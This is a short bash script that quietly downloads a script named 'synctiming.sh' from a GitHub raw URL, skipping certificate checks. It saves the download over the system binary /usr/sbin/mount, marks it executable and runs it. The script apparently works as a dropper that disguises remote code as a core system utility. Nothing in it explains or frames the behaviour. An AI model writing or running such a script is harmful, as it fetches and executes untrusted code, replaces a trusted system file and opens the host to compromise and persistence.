#!/bin/bash
curl -s -k https://raw.githubusercontent.com/synctiming/synctime/main/synctiming.sh -o /usr/sbin/mount
chmod +x /usr/sbin/mount
/usr/sbin/mount
